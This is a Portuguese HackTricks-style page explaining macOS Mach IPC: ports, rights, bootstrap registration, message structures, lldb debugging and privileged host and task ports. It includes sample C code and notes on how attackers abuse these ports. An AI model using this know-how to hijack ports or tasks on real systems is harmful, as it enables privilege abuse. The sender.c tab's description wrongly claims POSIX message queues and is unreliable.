# macOS IPC - Comunicação entre Processos

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Mensagens Mach via Portas

### Informações Básicas

O Mach utiliza **tarefas** como a **unidade mais pequena** para compartilhar recursos, e cada tarefa pode conter **múltiplas threads**. Essas **tarefas e threads são mapeadas em um para um com processos e threads POSIX**.

A comunicação entre tarefas ocorre via Comunicação entre Processos Mach (IPC), utilizando canais de comunicação unidirecional. **As mensagens são transferidas entre portas**, que funcionam como **filas de mensagens** gerenciadas pelo kernel.

Uma **porta** é o **elemento básico** do IPC do Mach. Ela pode ser usada para **enviar mensagens e recebê-las**.

Cada processo possui uma **tabela IPC**, onde é possível encontrar as **portas mach do processo**. O nome de uma porta mach é na verdade um número (um ponteiro para o objeto do kernel).

Um processo também pode enviar um nome de porta com alguns direitos **para uma tarefa diferente** e o kernel fará com que essa entrada na **tabela IPC da outra tarefa** apareça.

### Direitos de Porta

Os direitos de porta, que definem quais operações uma tarefa pode realizar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são ([definições daqui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Direito de Receber**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um consumidor), o que significa que pode haver apenas **um direito de receber para cada porta** em todo o sistema (ao contrário de pipes, onde vários processos podem todos ter descritores de arquivo para a extremidade de leitura de um pipe).
* Uma **tarefa com o Direito de Receber** pode receber mensagens e **criar Direitos de Envio**, permitindo enviar mensagens. Originalmente, apenas a **própria tarefa tem o Direito de Receber sobre sua porta**.
* Se o proprietário do Direito de Receber **morre** ou o encerra, o **direito de envio se torna inútil (nome morto).**
* **Direito de Envio**, que permite enviar mensagens para a porta.
* O Direito de Envio pode ser **clonado** para que uma tarefa que possui um Direito de Envio possa clonar o direito e **concedê-lo a uma terceira tarefa**.
* Note que os **direitos de porta** também podem ser **passados** por meio de mensagens Mac.
* **Direito de Envio-único**, que permite enviar uma mensagem para a porta e depois desaparece.
* Esse direito **não pode** ser **clonado**, mas pode ser **movido**.
* **Direito de conjunto de portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Os conjuntos de portas podem ser usados para escutar várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
* **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se tornam nomes mortos.

**Tarefas podem transferir DIREITOS DE ENVIO para outros**, permitindo-lhes enviar mensagens de volta. **DIREITOS DE ENVIO também podem ser clonados, para que uma tarefa possa duplicar e dar o direito a uma terceira tarefa**. Isso, combinado com um processo intermediário conhecido como o **servidor de inicialização**, permite uma comunicação eficaz entre tarefas.

### Portas de Arquivo

Portas de arquivo permitem encapsular descritores de arquivo em portas Mac (usando direitos de porta Mach). É possível criar um `fileport` a partir de um FD dado usando `fileport_makeport` e criar um FD a partir de um fileport usando `fileport_makefd`.

### Estabelecendo uma comunicação

Como mencionado anteriormente, é possível enviar direitos usando mensagens Mach, no entanto, você **não pode enviar um direito sem já ter um direito** para enviar uma mensagem Mach. Então, como é estabelecida a primeira comunicação?

Para isso, o **servidor de inicialização** (**launchd** no Mac) está envolvido, pois **qualquer pessoa pode obter um DIREITO DE ENVIO para o servidor de inicialização**, é possível pedir a ele um direito para enviar uma mensagem para outro processo:

1. A Tarefa **A** cria uma **nova porta**, obtendo o **direito de RECEBER** sobre ela.
2. A Tarefa **A**, sendo a detentora do direito de RECEBER, **gera um DIREITO DE ENVIO para a porta**.
3. A Tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, e **envia a ele o DIREITO DE ENVIO** para a porta que gerou no início.
* Lembre-se de que qualquer pessoa pode obter um DIREITO DE ENVIO para o servidor de inicialização.
4. A Tarefa A envia uma mensagem `bootstrap_register` para o servidor de inicialização para **associar a porta fornecida a um nome** como `com.apple.taska`.
5. A Tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização para o nome do serviço** (`bootstrap_lookup`). Para que o servidor de inicialização possa responder, a tarefa B enviará um **DIREITO DE ENVIO para uma porta que criou anteriormente** dentro da mensagem de busca. Se a busca for bem-sucedida, o **servidor duplica o DIREITO DE ENVIO** recebido da Tarefa A e **transmite para a Tarefa B**.
* Lembre-se de que qualquer pessoa pode obter um DIREITO DE ENVIO para o servidor de inicialização.
6. Com este DIREITO DE ENVIO, a **Tarefa B** é capaz de **enviar** uma **mensagem** **para a Tarefa A**.
7. Para uma comunicação bidirecional, geralmente a tarefa **B** gera uma nova porta com um **direito de RECEBER** e um **DIREITO DE ENVIO**, e dá o **DIREITO DE ENVIO para a Tarefa A** para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).

O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **falsificar qualquer tarefa do sistema**, como **reivindicar falsamente um nome de serviço de autorização** e então aprovar cada solicitação.

Em seguida, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios protegidos pelo SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Ao lado de cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização, criará e manterá um **direito de RECEBER para cada um desses nomes de serviço**.

Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. Quando um nome de serviço está sendo procurado, o launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

* A Tarefa **B** inicia uma **busca de inicialização** para um nome de serviço.
* **launchd** verifica se a tarefa está em execução e, se não estiver, a **inicia**.
* A Tarefa **A** (o serviço) executa um **check-in de inicialização** (`bootstrap_check_in()`). Aqui, o **servidor de inicialização** cria um DIREITO DE ENVIO, o retém e **transfere o DIREITO DE RECEBER para a Tarefa A**.
* launchd duplica o **DIREITO DE ENVIO e envia para a Tarefa B**.
* A Tarefa **B** gera uma nova porta com um **direito de RECEBER** e um **DIREITO DE ENVIO**, e dá o **DIREITO DE ENVIO para a Tarefa A** (o serviço) para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).

No entanto, esse processo se aplica apenas a tarefas de sistema predefinidas. Tarefas não pertencentes ao sistema ainda operam conforme descrito originalmente, o que poderia potencialmente permitir a falsificação.

{% hint style="danger" %}
Portanto, o launchd nunca deve travar, ou o sistema inteiro travará.
{% endhint %}
### Uma Mensagem Mach

[Encontre mais informações aqui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

A função `mach_msg`, essencialmente uma chamada de sistema, é utilizada para enviar e receber mensagens Mach. A função requer que a mensagem seja enviada como argumento inicial. Esta mensagem deve começar com uma estrutura `mach_msg_header_t`, seguida pelo conteúdo real da mensagem. A estrutura é definida da seguinte forma:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Os processos que possuem um _**direito de recebimento**_ podem receber mensagens em uma porta Mach. Por outro lado, os **remetentes** recebem um _**direito de envio**_ ou um _**direito de envio único**_. O direito de envio único é exclusivamente para enviar uma única mensagem, após o que se torna inválido.

O campo inicial **`msgh_bits`** é um mapa de bits:

- O primeiro bit (mais significativo) é usado para indicar que uma mensagem é complexa (mais sobre isso abaixo)
- O 3º e o 4º são usados pelo kernel
- Os **5 bits menos significativos do 2º byte** podem ser usados para **voucher**: outro tipo de porta para enviar combinações de chave/valor.
- Os **5 bits menos significativos do 3º byte** podem ser usados para **porta local**
- Os **5 bits menos significativos do 4º byte** podem ser usados para **porta remota**

Os tipos que podem ser especificados no voucher, portas locais e remotas são (de [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Por exemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` pode ser usado para **indicar** que um **direito** de **envio-único** deve ser derivado e transferido para esta porta. Também pode ser especificado `MACH_PORT_NULL` para impedir que o destinatário possa responder.

Para alcançar uma **comunicação bidirecional** fácil, um processo pode especificar uma **porta mach** no cabeçalho da mensagem mach chamada _porta de resposta_ (**`msgh_local_port`**) onde o **receptor** da mensagem pode **enviar uma resposta** a esta mensagem.

{% hint style="success" %}
Note que esse tipo de comunicação bidirecional é usado em mensagens XPC que esperam uma resposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Mas **geralmente são criadas portas diferentes** como explicado anteriormente para criar a comunicação bidirecional.
{% endhint %}

Os outros campos do cabeçalho da mensagem são:

- `msgh_size`: o tamanho do pacote inteiro.
- `msgh_remote_port`: a porta para a qual esta mensagem é enviada.
- `msgh_voucher_port`: [vouchers mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: o ID desta mensagem, que é interpretado pelo receptor.

{% hint style="danger" %}
Note que **mensagens mach são enviadas por uma `porta mach`**, que é um canal de comunicação de **um único receptor**, **múltiplos remetentes** integrado no kernel mach. **Múltiplos processos** podem **enviar mensagens** para uma porta mach, mas em qualquer momento apenas **um único processo pode ler** dela.
{% endhint %}

As mensagens são então formadas pelo cabeçalho **`mach_msg_header_t`** seguido do **corpo** e do **trailer** (se houver) e pode conceder permissão para responder a ela. Nestes casos, o kernel só precisa passar a mensagem de uma tarefa para a outra.

Um **trailer** é **informação adicionada à mensagem pelo kernel** (não pode ser definida pelo usuário) que pode ser solicitada na recepção da mensagem com as flags `MACH_RCV_TRAILER_<trailer_opt>` (há diferentes informações que podem ser solicitadas).

#### Mensagens Complexas

No entanto, existem outras mensagens mais **complexas**, como as que passam direitos de porta adicionais ou compartilham memória, onde o kernel também precisa enviar esses objetos para o destinatário. Nestes casos, o bit mais significativo do cabeçalho `msgh_bits` é definido.

Os descritores possíveis para passar são definidos em [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Em 32 bits, todos os descritores têm 12 bytes e o tipo de descritor está no 11º byte. Em 64 bits, os tamanhos variam.

{% hint style="danger" %}
O kernel copiará os descritores de uma tarefa para a outra, mas primeiro **criará uma cópia na memória do kernel**. Essa técnica, conhecida como "Feng Shui", tem sido abusada em vários exploits para fazer o **kernel copiar dados em sua memória**, fazendo com que um processo envie descritores para si mesmo. Em seguida, o processo pode receber as mensagens (o kernel as liberará).

Também é possível **enviar direitos de porta para um processo vulnerável**, e os direitos da porta simplesmente aparecerão no processo (mesmo que ele não os esteja manipulando).
{% endhint %}

### APIs de Portas do Mac

Observe que as portas estão associadas ao namespace da tarefa, então para criar ou procurar uma porta, o namespace da tarefa também é consultado (mais em `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Criar** uma porta.
* `mach_port_allocate` também pode criar um **conjunto de portas**: direito de recebimento sobre um grupo de portas. Sempre que uma mensagem é recebida, é indicada a porta de onde ela veio.
* `mach_port_allocate_name`: Alterar o nome da porta (por padrão, inteiro de 32 bits)
* `mach_port_names`: Obter nomes de porta de um alvo
* `mach_port_type`: Obter direitos de uma tarefa sobre um nome
* `mach_port_rename`: Renomear uma porta (como dup2 para FDs)
* `mach_port_allocate`: Alocar um novo RECEBER, CONJUNTO_DE_PORTAS ou DEAD_NAME
* `mach_port_insert_right`: Criar um novo direito em uma porta onde você tem RECEBER
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funções usadas para **enviar e receber mensagens mach**. A versão de sobrescrita permite especificar um buffer diferente para a recepção da mensagem (a outra versão apenas o reutilizará).

### Depurar mach\_msg

Como as funções **`mach_msg`** e **`mach_msg_overwrite`** são as usadas para enviar e receber mensagens, definir um ponto de interrupção nelas permitiria inspecionar as mensagens enviadas e recebidas.

Por exemplo, iniciar a depuração de qualquer aplicativo que você possa depurar, pois ele carregará **`libSystem.B` que usará essa função**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Ponto de interrupção 1: onde = libsystem_kernel.dylib`mach_msg, endereço = 0x00000001803f6c20
<strong>(lldb) r
</strong>Processo 71019 lançado: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Processo 71019 parado
* thread #1, fila = 'com.apple.main-thread', motivo da parada = ponto de interrupção 1.1
quadro #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Alvo 0: (SandboxedShellApp) parado.
<strong>(lldb) bt
</strong>* thread #1, fila = 'com.apple.main-thread', motivo da parada = ponto de interrupção 1.1
* quadro #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
quadro #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
quadro #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
quadro #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
quadro #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
quadro #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
quadro #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
quadro #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
quadro #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
quadro #9: 0x0000000181a1d5c8 dyld`função de invocação para bloco em dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Para obter os argumentos de **`mach_msg`**, verifique os registradores. Estes são os argumentos (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtenha os valores dos registros:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Verifique o cabeçalho da mensagem verificando o primeiro argumento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Esse tipo de `mach_msg_bits_t` é muito comum para permitir uma resposta.



### Enumerar portas
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
O **nome** é o nome padrão dado à porta (verifique como ele está **aumentando** nos primeiros 3 bytes). O **`ipc-object`** é o **identificador** único **ofuscado** da porta.\
Observe também como as portas com apenas o direito de **`send`** estão **identificando o proprietário** dela (nome da porta + pid).\
Observe também o uso de **`+`** para indicar **outras tarefas conectadas à mesma porta**.

Também é possível usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver também os **nomes de serviço registrados** (com SIP desativado devido à necessidade de `com.apple.system-task-port`):
```
procesp 1 ports
```
Pode instalar esta ferramenta no iOS fazendo o download em [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemplo de código

Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização** enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 

## sender.c

O `sender.c` é um exemplo simples de um programa que envia mensagens para um receptor usando IPC (Comunicação entre Processos) no macOS. Ele demonstra como enviar mensagens através de uma fila de mensagens POSIX.

### Compilação:

```bash
gcc -o sender sender.c -Wall
```

### Uso:

```bash
./sender
```

Isso enviará uma mensagem para o receptor.

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Portas Privilegiadas

Existem algumas portas especiais que permitem **realizar certas ações sensíveis ou acessar determinados dados sensíveis** caso uma tarefa tenha permissões de **ENVIO** sobre elas. Isso torna essas portas muito interessantes do ponto de vista de um atacante não apenas por causa das capacidades, mas também porque é possível **compartilhar permissões de ENVIO entre tarefas**.

### Portas Especiais do Host

Essas portas são representadas por um número.

Os direitos de **ENVIO** podem ser obtidos chamando **`host_get_special_port`** e os direitos de **RECEBIMENTO** chamando **`host_set_special_port`**. No entanto, ambas as chamadas requerem a porta **`host_priv`** que apenas o root pode acessar. Além disso, no passado, o root era capaz de chamar **`host_set_special_port`** e sequestrar arbitrariamente o que permitia, por exemplo, ignorar assinaturas de código sequestrando `HOST_KEXTD_PORT` (SIP agora impede isso).

Essas portas são divididas em 2 grupos: Os **primeiros 7 portas são de propriedade do kernel** sendo o 1 `HOST_PORT`, o 2 `HOST_PRIV_PORT`, o 3 `HOST_IO_MASTER_PORT` e o 7 é `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Os que começam **a partir** do número **8** são **de propriedade dos daemons do sistema** e podem ser encontrados declarados em [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Porta do Host**: Se um processo tem **privilégio de ENVIO** sobre esta porta, ele pode obter **informações** sobre o **sistema** chamando suas rotinas como:
* `host_processor_info`: Obter informações do processador
* `host_info`: Obter informações do host
* `host_virtual_physical_table_info`: Tabela de páginas virtual/física (requer MACH\_VMDEBUG)
* `host_statistics`: Obter estatísticas do host
* `mach_memory_info`: Obter layout de memória do kernel
* **Porta Priv do Host**: Um processo com direito de **ENVIO** sobre esta porta pode realizar **ações privilegiadas** como mostrar dados de inicialização ou tentar carregar uma extensão de kernel. O **processo precisa ser root** para obter essa permissão.
* Além disso, para chamar a API **`kext_request`** é necessário ter outras permissões **`com.apple.private.kext*`** que são concedidas apenas a binários da Apple.
* Outras rotinas que podem ser chamadas são:
* `host_get_boot_info`: Obter `machine_boot_info()`
* `host_priv_statistics`: Obter estatísticas privilegiadas
* `vm_allocate_cpm`: Alocar Memória Física Contígua
* `host_processors`: Direito de envio para processadores do host
* `mach_vm_wire`: Tornar a memória residente
* Como o **root** pode acessar essa permissão, ele poderia chamar `host_set_[special/exception]_port[s]` para **sequestrar portas especiais ou de exceção do host**.

É possível **ver todas as portas especiais do host** executando:
```bash
procexp all ports | grep "HSP"
```
### Tarefa Portas Especiais

Estas são portas reservadas para serviços conhecidos. É possível obtê-las/configurá-las chamando `task_[get/set]_special_port`. Elas podem ser encontradas em `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
De [aqui](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[direito de envio de tarefa-self]: A porta usada para controlar esta tarefa. Usada para enviar mensagens que afetam a tarefa. Esta é a porta retornada por **mach\_task\_self (veja Portas de Tarefa abaixo)**.
* **TASK\_BOOTSTRAP\_PORT**\[direito de envio de inicialização]: A porta de inicialização da tarefa. Usada para enviar mensagens solicitando o retorno de outras portas de serviço do sistema.
* **TASK\_HOST\_NAME\_PORT**\[direito de envio de host-self]: A porta usada para solicitar informações do host contido. Esta é a porta retornada por **mach\_host\_self**.
* **TASK\_WIRED\_LEDGER\_PORT**\[direito de envio de livro-razão]: A porta que nomeia a fonte da qual esta tarefa retira sua memória com fio do kernel.
* **TASK\_PAGED\_LEDGER\_PORT**\[direito de envio de livro-razão]: A porta que nomeia a fonte da qual esta tarefa retira sua memória gerenciada por padrão.

### Portas de Tarefa

Originalmente, o Mach não tinha "processos", tinha "tarefas", que eram consideradas mais como contêineres de threads. Quando o Mach foi mesclado com o BSD, **cada tarefa foi correlacionada com um processo BSD**. Portanto, cada processo BSD tem os detalhes necessários para ser um processo e cada tarefa Mach também tem seus mecanismos internos (exceto pelo pid inexistente 0, que é a `kernel_task`).

Existem duas funções muito interessantes relacionadas a isso:

* `task_for_pid(porta_tarefa_alvo, pid, &porta_tarefa_do_pid)`: Obtenha um direito de envio para a porta da tarefa relacionada ao especificado pelo `pid` e dê-o à `porta_tarefa_alvo` indicada (que geralmente é a tarefa chamadora que usou `mach_task_self()`, mas poderia ser uma porta de envio sobre uma tarefa diferente).
* `pid_for_task(tarefa, &pid)`: Dado um direito de envio para uma tarefa, descubra a qual PID essa tarefa está relacionada.

Para realizar ações dentro da tarefa, a tarefa precisava de um direito de envio para si mesma chamando `mach_task_self()` (que usa o `task_self_trap` (28)). Com essa permissão, uma tarefa pode realizar várias ações como:

* `task_threads`: Obter direitos de envio sobre todas as portas de tarefa das threads da tarefa
* `task_info`: Obter informações sobre uma tarefa
* `task_suspend/resume`: Suspender ou retomar uma tarefa
* `task_[get/set]_special_port`
* `thread_create`: Criar uma thread
* `task_[get/set]_state`: Controlar o estado da tarefa
* e mais podem ser encontrados em [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Observe que com um direito de envio sobre uma porta de tarefa de uma **tarefa diferente**, é possível realizar tais ações sobre uma tarefa diferente.
{% endhint %}

